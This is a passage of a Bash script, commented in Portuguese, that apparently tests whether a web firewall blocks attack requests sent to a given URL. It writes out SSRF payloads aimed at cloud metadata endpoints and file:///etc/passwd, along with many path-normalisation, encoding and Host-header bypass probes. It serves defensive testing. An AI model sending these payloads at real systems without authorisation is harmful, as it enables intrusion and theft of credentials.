    print_section "🌐 TESTES DE SSRF - Server Side Request Forgery (15 testes)"
    
    print_subsection "Localhost e IPs Internos"
    test_curl "SSRF: http://localhost" "block" -A "$UA" -Lk "${URL}?url=http://localhost"
    test_curl "SSRF: http://127.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1"
    test_curl "SSRF: http://[::1]" "block" -A "$UA" -Lk "${URL}?url=http://[::1]"
    test_curl "SSRF: http://0.0.0.0" "block" -A "$UA" -Lk "${URL}?url=http://0.0.0.0"
    test_curl "SSRF: http://192.168.1.1" "block" -A "$UA" -Lk "${URL}?url=http://192.168.1.1"
    test_curl "SSRF: http://10.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://10.0.0.1"
    
    print_subsection "Cloud Metadata"
    test_curl "SSRF: AWS metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/meta-data/"
    test_curl "SSRF: GCP metadata" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/"
    test_curl "SSRF: Azure metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/instance"
    test_curl "SSRF: DigitalOcean" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/v1/"
    
    print_subsection "Bypass e Protocolos"
    test_curl "SSRF: file://" "block" -A "$UA" -Lk "${URL}?url=file:///etc/passwd"
    test_curl "SSRF: gopher://" "block" -A "$UA" -Lk "${URL}?url=gopher://localhost:25/"
    test_curl "SSRF: dict://" "block" -A "$UA" -Lk "${URL}?url=dict://localhost:11211/"
    test_curl "SSRF: 127.0.0.1 decimal" "block" -A "$UA" -Lk "${URL}?url=http://2130706433"
    test_curl "SSRF: localhost hex" "block" -A "$UA" -Lk "${URL}?url=http://0x7f000001"
}

#==============================================================================
# PATH/URL BYPASS TECHNIQUES (40+ testes)
#==============================================================================
test_path_bypass() {
    print_section "🔓 TESTES DE PATH/URL BYPASS (40+ testes)"
    
    print_subsection "Null Byte Injection"
    test_curl "Null Byte: admin.php%00.html" "block" -A "$UA" -Lk --path-as-is "${URL}/admin.php%00.html"
    test_curl "Null Byte: admin%00" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%00"
    test_curl "Null Byte: admin.php%00.jpg" "block" -A "$UA" -Lk --path-as-is "${URL}/admin.php%00.jpg"
    test_curl "Null Byte: config.php%00.txt" "block" -A "$UA" -Lk --path-as-is "${URL}/config.php%00.txt"
    test_curl "Null Byte: /etc/passwd%00" "block" -A "$UA" -Lk --path-as-is "${URL}/../../../etc/passwd%00"
    
    print_subsection "HTTP Version Downgrade"
    test_curl "HTTP/1.0: /admin" "block" -A "$UA" -Lk --http1.0 "${URL}/admin"
    test_curl "HTTP/1.0: /wp-admin" "block" -A "$UA" -Lk --http1.0 "${URL}/wp-admin"
    test_curl "HTTP/1.0: /phpmyadmin" "block" -A "$UA" -Lk --http1.0 "${URL}/phpmyadmin"
    
    print_subsection "Parameter Tampering"
    test_curl "Param: /admin?unused_param=1" "block" -A "$UA" -Lk "${URL}/admin?unused_param=1"
    test_curl "Param: /admin?foo=bar" "block" -A "$UA" -Lk "${URL}/admin?foo=bar"
    test_curl "Param: /admin?debug=1" "block" -A "$UA" -Lk "${URL}/admin?debug=1"
    test_curl "Param: /admin?bypass=true" "block" -A "$UA" -Lk "${URL}/admin?bypass=true"
    test_curl "Fragment: /admin?foo=bar#" "block" -A "$UA" -Lk "${URL}/admin?foo=bar#"
    
    print_subsection "Case Manipulation"
    test_curl "Case: /Admin" "block" -A "$UA" -Lk "${URL}/Admin"
    test_curl "Case: /ADMIN" "block" -A "$UA" -Lk "${URL}/ADMIN"
    test_curl "Case: /aDmIn" "block" -A "$UA" -Lk "${URL}/aDmIn"
    test_curl "Case: /Wp-Admin" "block" -A "$UA" -Lk "${URL}/Wp-Admin"
    test_curl "Case: /WP-ADMIN" "block" -A "$UA" -Lk "${URL}/WP-ADMIN"
    
    print_subsection "Trailing Slash e Dot"
    test_curl "Trailing Slash: /admin/" "block" -A "$UA" -Lk "${URL}/admin/"
    test_curl "Trailing Dot: /admin." "block" -A "$UA" -Lk "${URL}/admin."
    test_curl "Double Trailing Slash: /admin//" "block" -A "$UA" -Lk "${URL}/admin//"
    test_curl "Trailing Dot+Slash: /admin./" "block" -A "$UA" -Lk "${URL}/admin./"
    
    print_subsection "Path Confusion (..;/ e similares)"
    test_curl "Path Confusion: /..;/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/..;/admin"
    test_curl "Path Confusion: /;/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/;/admin"
    test_curl "Path Confusion: /.;/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/.;/admin"
    test_curl "Path Confusion: /./admin" "block" -A "$UA" -Lk --path-as-is "${URL}/./admin"
    test_curl "Path Confusion: /admin/." "block" -A "$UA" -Lk --path-as-is "${URL}/admin/."
    
    print_subsection "Double Slashes e Multiple Slashes"
    test_curl "Double Slash: //admin" "block" -A "$UA" -Lk "${URL}//admin"
    test_curl "Double Slash: //admin//" "block" -A "$UA" -Lk "${URL}//admin//"
    test_curl "Triple Slash: ///admin" "block" -A "$UA" -Lk "${URL}///admin"
    test_curl "Multiple Slash: ////admin////" "block" -A "$UA" -Lk "${URL}////admin////"
    
    print_subsection "URL Encoding Bypass"
    test_curl "Encoded Slash: /admin%2f" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%2f"
    test_curl "Encoded Slash: /%2fadmin" "block" -A "$UA" -Lk --path-as-is "${URL}/%2fadmin"
    test_curl "Double Encoded: /admin%252f" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%252f"
    test_curl "Encoded Dot: /admin%2e" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%2e"
    test_curl "Encoded a: /%61dmin" "block" -A "$UA" -Lk --path-as-is "${URL}/%61dmin"
    
    print_subsection "Random Extension Append"
    test_curl "Extension: /admin.php" "block" -A "$UA" -Lk "${URL}/admin.php"
    test_curl "Extension: /admin.json" "block" -A "$UA" -Lk "${URL}/admin.json"
    test_curl "Extension: /admin.html" "block" -A "$UA" -Lk "${URL}/admin.html"
    test_curl "Extension: /admin.xml" "block" -A "$UA" -Lk "${URL}/admin.xml"
    test_curl "Extension: /admin.aspx" "block" -A "$UA" -Lk "${URL}/admin.aspx"
    
    print_subsection "Backslash e Mixed Slashes"
    test_curl "Backslash: \\admin" "block" -A "$UA" -Lk --path-as-is "${URL}/\\admin"
    test_curl "Mixed: /admin\\" "block" -A "$UA" -Lk --path-as-is "${URL}/admin\\"
    test_curl "Mixed: /admin\\/" "block" -A "$UA" -Lk --path-as-is "${URL}/admin\\/"
    test_curl "Mixed: \\/admin" "block" -A "$UA" -Lk --path-as-is "${URL}\\/admin"
    
    print_subsection "Trailing Semicolon e Space"
    test_curl "Semicolon: /admin;" "block" -A "$UA" -Lk --path-as-is "${URL}/admin;"
    test_curl "Semicolon: /admin;.js" "block" -A "$UA" -Lk --path-as-is "${URL}/admin;.js"
    test_curl "Encoded Space: /admin%20" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%20"
    test_curl "Tab: /admin%09" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%09"
    
    print_subsection "Unicode Tricks"
    test_curl "Unicode Slash: /admin%c0%af" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%c0%af"
    test_curl "Unicode Slash: /admin%ef%bc%8f" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%ef%bc%8f"
    test_curl "Unicode Dot: /admin%c0%ae" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%c0%ae"
    test_curl "Fullwidth: /admin／" "block" -A "$UA" -Lk "${URL}/admin／"
    test_curl "Fullwidth Path: ／admin" "block" -A "$UA" -Lk "${URL}/／admin"
    
    print_subsection "Path Normalization Bypass"
    test_curl "Dot-Dot: /admin/../admin" "block" -A "$UA" -Lk "${URL}/admin/../admin"
    test_curl "Dot-Dot-Dot: /admin/.../admin" "block" -A "$UA" -Lk --path-as-is "${URL}/admin/.../admin"
    test_curl "Current Dir: /./././admin" "block" -A "$UA" -Lk "${URL}/./././admin"
    test_curl "Mixed: /foo/../admin" "block" -A "$UA" -Lk "${URL}/foo/../admin"
    
    print_subsection "Special Characters in Path"
    test_curl "Hash: /admin#" "block" -A "$UA" -Lk "${URL}/admin#"
    test_curl "Question: /admin?" "block" -A "$UA" -Lk "${URL}/admin?"
    test_curl "Ampersand: /admin&" "block" -A "$UA" -Lk --path-as-is "${URL}/admin&"
    test_curl "Equals: /admin=" "block" -A "$UA" -Lk --path-as-is "${URL}/admin="
    test_curl "Plus: /admin+" "block" -A "$UA" -Lk "${URL}/admin+"
    
    print_subsection "Path Fuzzing & Encoding (%2e = dot)"
    test_curl "Encoded ..: /%2e%2e/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e/admin"
    test_curl "Encoded ..: /%2e%2e/%2e%2e/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/%2e%2e/%2e%2e/admin"
    test_curl "Mixed: /..%2fadmin" "block" -A "$UA" -Lk --path-as-is "${URL}/..%2fadmin"
    test_curl "GET: /../admin/" "block" -A "$UA" -Lk -X GET "${URL}/../admin/"
    test_curl "GET path-as-is: /../admin/" "block" -A "$UA" -Lk -X GET --path-as-is "${URL}/../admin/"
    test_curl "Triple ..: /...%2f...%2fadmin" "block" -A "$UA" -Lk --path-as-is "${URL}/...%2f...%2fadmin"
    test_curl "Overlong UTF-8 dot: /%c0%2e%c0%2e/admin" "block" -A "$UA" -Lk --path-as-is "${URL}/%c0%2e%c0%2e/admin"
    
    print_subsection "HTTP/HTTPS Protocol Switch"
    # Extrair host da URL para testar protocolo alternativo
    local host_part
    host_part=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
    if [[ "$URL" == https://* ]]; then
        test_curl "HTTP (sem TLS): /admin" "block" -A "$UA" -Lk "http://${host_part}/admin"
        test_curl "HTTP (sem TLS): /private" "block" -A "$UA" -Lk "http://${host_part}/private"
        test_curl "HTTP (sem TLS): /wp-admin" "block" -A "$UA" -Lk "http://${host_part}/wp-admin"
    else
        test_curl "HTTPS: /admin" "block" -A "$UA" -Lk "https://${host_part}/admin"
        test_curl "HTTPS: /private" "block" -A "$UA" -Lk "https://${host_part}/private"
        test_curl "HTTPS: /wp-admin" "block" -A "$UA" -Lk "https://${host_part}/wp-admin"
    fi
    
    print_subsection "Portas Alternativas"
    local base_host
    base_host=$(echo "$host_part" | sed -E 's|:[0-9]+$||')
    local protocol
    [[ "$URL" == https://* ]] && protocol="https" || protocol="http"
    test_curl "Porta 8080: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:8080/admin" 2>/dev/null || true
    test_curl "Porta 8443: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "https://${base_host}:8443/admin" 2>/dev/null || true
    test_curl "Porta 8000: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:8000/admin" 2>/dev/null || true
    test_curl "Porta 3000: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:3000/admin" 2>/dev/null || true
    test_curl "Porta 9000: /admin" "block" -A "$UA" -Lk --connect-timeout 3 "${protocol}://${base_host}:9000/admin" 2>/dev/null || true
    
    print_subsection "Subdomínios Alternativos (via Host header)"
    test_curl "Subdomain: admin.host" "block" -A "$UA" -Lk -H "Host: admin.${base_host}" "${URL}/admin"
    test_curl "Subdomain: dev.host" "block" -A "$UA" -Lk -H "Host: dev.${base_host}" "${URL}/admin"
    test_curl "Subdomain: api.host" "block" -A "$UA" -Lk -H "Host: api.${base_host}" "${URL}/admin"
    test_curl "Subdomain: staging.host" "block" -A "$UA" -Lk -H "Host: staging.${base_host}" "${URL}/admin"
    test_curl "Subdomain: internal.host" "block" -A "$UA" -Lk -H "Host: internal.${base_host}" "${URL}/admin"
}

#==============================================================================
# RESUMO FINAL
#==============================================================================
print_summary() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}                              RESUMO DOS TESTES                               ${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "  ${BOLD}URL Testada:${NC}     $URL"
    echo -e "  ${BOLD}Total de Testes:${NC} $TOTAL_TESTS"
    echo -e "  ${GREEN}Passaram:${NC}        $PASSED_TESTS"
    echo -e "  ${RED}Falharam:${NC}        $FAILED_TESTS"
    
    local success_rate=0
    [ $TOTAL_TESTS -gt 0 ] && success_rate=$((PASSED_TESTS * 100 / TOTAL_TESTS))
    
    echo ""
    if [ $success_rate -ge 80 ]; then
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${GREEN}${success_rate}%${NC} ✅"
    elif [ $success_rate -ge 50 ]; then
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${YELLOW}${success_rate}%${NC} ⚠️"
    else
        echo -e "  ${BOLD}Taxa de Sucesso:${NC} ${RED}${success_rate}%${NC} ❌"
    fi
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════${NC}"
}

#==============================================================================
# SELEÇÃO DE USER-AGENT
#==============================================================================
select_user_agent() {
    echo -e "${BOLD}Selecione um User-Agent:${NC}"
    for i in "${!USER_AGENTS[@]}"; do
        printf "  %d. %s...\n" "$((i+1))" "${USER_AGENTS[i]:0:60}"
    done
    while true; do
        read -rp "Número (1-${#USER_AGENTS[@]}): " UA_INDEX
        if [[ "$UA_INDEX" =~ ^[0-9]+$ ]] && [ "$UA_INDEX" -ge 1 ] && [ "$UA_INDEX" -le "${#USER_AGENTS[@]}" ]; then
            UA="${USER_AGENTS[$((UA_INDEX-1))]}"
            break
        fi
        echo -e "${RED}Número inválido.${NC}"
    done
}

#==============================================================================
# MAIN
#==============================================================================
CATEGORY="all"

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help) echo "Uso: $0 [-v] [-o arquivo] [-u num] [-c categoria] <URL>"; exit 0 ;;
        -v|--verbose) VERBOSE=true; shift ;;
        -o|--output) OUTPUT_FILE="$2"; shift 2 ;;
        -u|--user-agent) UA="${USER_AGENTS[$(($2-1))]}"; shift 2 ;;
        -c|--category) CATEGORY="$2"; shift 2 ;;
        -*) echo "Opção desconhecida: $1"; exit 1 ;;
        *) URL="$1"; shift ;;
    esac
done

[ -z "$URL" ] && { show_banner; echo -e "${RED}Erro: URL não fornecida.${NC}"; exit 1; }
[[ ! "$URL" =~ ^https?:// ]] && { echo -e "${RED}URL deve começar com http:// ou https://${NC}"; exit 1; }

show_banner
[ -z "$UA" ] && select_user_agent

echo -e "${BOLD}Iniciando testes em:${NC} $URL"

# Executar testes baseado na categoria
case $CATEGORY in
    method) test_all_http_methods ;;
    cookie) test_malicious_cookies ;;
    query) test_malicious_query ;;
    useragent) test_bad_user_agents; test_good_bots; test_fake_bots ;;
    referer|referer-all) test_bad_referers ;;
    referer-spam|spam) test_referers_spam ;;
    referer-seo|seoblackhat) test_referers_seo_blackhat ;;
    referer-injection|injection-referer) test_referers_injection ;;
    host) test_invalid_host ;;
    uri) test_malicious_uri ;;
    header) test_header_injection ;;
    contenttype) test_content_type ;;
    encoding) test_accept_encoding ;;
    xff) test_xff_spoofing ;;
    range) test_range_header ;;
    smuggling) test_http_smuggling ;;
    fakebots) test_fake_bots ;;
    nginx) test_nginx_attacks ;;
    php) test_php_attacks ;;
    database|db) test_database_attacks ;;
    ssrf) test_ssrf_attacks ;;
    pathbypass|bypass) test_path_bypass ;;
    all)
        test_all_http_methods
        test_malicious_cookies
        test_malicious_query
        test_invalid_host
        test_malicious_uri
        test_header_injection
        test_content_type
        test_accept_encoding
        test_xff_spoofing
        test_range_header
        test_http_smuggling
        test_nginx_attacks
        test_php_attacks
        test_database_attacks
        test_ssrf_attacks
        test_path_bypass
        test_bad_user_agents
        test_bad_referers
        test_good_bots
        test_fake_bots
        ;;
    *) echo "Categoria desconhecida: $CATEGORY"; exit 1 ;;
esac

print_summary
exit 0
